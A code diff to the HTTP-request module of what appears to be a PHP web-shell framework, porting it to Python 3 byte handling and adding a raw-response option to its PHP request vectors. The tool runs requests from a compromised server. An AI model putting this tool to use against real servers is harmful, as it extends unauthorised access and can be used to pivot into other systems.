@@ -30,22 +30,27 @@ class Curl(Module):
             PhpFile(
               payload_path = os.path.join(self.folder, 'php_context.tpl'),
               name = 'file_get_contents',
+              arguments = [ '-raw-response' ]
             ),
             PhpFile(
               payload_path = os.path.join(self.folder, 'php_context.tpl'),
               name = 'fopen_stream_get_contents',
+              arguments = [ '-raw-response' ]
             ),
             PhpFile(
               payload_path = os.path.join(self.folder, 'php_context.tpl'),
               name = 'fopen_fread',
+              arguments = [ '-raw-response' ]
             ),
             PhpFile(
               payload_path = os.path.join(self.folder, 'php_curl.tpl'),
               name = 'php_curl',
+              arguments = [ '-raw-response' ]
             ),
             PhpFile(
               payload_path = os.path.join(self.folder, 'php_httprequest1.tpl'),
               name = 'php_httprequest1',
+              arguments = [ '-raw-response' ]
             ),
             
             # TODO: fix this, it fails the "POST request with binary string" test
@@ -109,22 +114,22 @@ class Curl(Module):
 
         # Print error and exit with no response or no headers
         if not (vector_name and result):
-            log.warn(messages.module_net_curl.unexpected_response)
+            log.warning(messages.module_net_curl.unexpected_response)
             return None, headers, saved
-        elif not '\r\n'*2 in result:
+        elif not b'\r\n'*2 in result:
             # If something is returned but there is \r\n*2, we consider
             # everything as header. It happen with responses 204 No contents
             # that end with \r\n\r (wtf).
             headers = result
-            result = ''
+            result = b''
         else:
-            headers, result = result.split('\r\n'*2, 1)
+            headers, result = result.split(b'\r\n'*2, 1)
 
         headers = (
             [
                 h.rstrip() for h
-                in headers.split('\r\n')
-            ] if '\r\n' in headers
+                in headers.split(b'\r\n')
+            ] if b'\r\n' in headers
             else headers
         )
 
@@ -137,7 +142,8 @@ class Curl(Module):
                 saved = ModuleExec('file_upload', [ '-content', result, output_path ]).run()
             else:
                 try:
-                    open(output_path, 'wb').write(result)
+                    with open(output_path, 'wb') as resultfile:
+                        resultfile.write(result)
                 except Exception as e:
                     log.warning(
                       messages.generic.error_loading_file_s_s % (output_path, str(e)))
@@ -149,7 +155,9 @@ class Curl(Module):
 
     def print_result(self, result):
 
-        result, headers, saved = result
+        resultstring = result[0].decode("utf-8", "replace") 
+        headers = [ r.decode("utf-8", "replace") for r in result[1] ] 
+        saved = result[2]
 
         # If is saved, we do not want output
         if self.args.get('output'):
@@ -160,5 +168,5 @@ class Curl(Module):
         if self.args.get('include_headers'):
             log.info( '\r\n'.join(headers) + '\r\n')
 
-        if result:
-            log.info(result)
+        if resultstring:
+            log.info(resultstring)
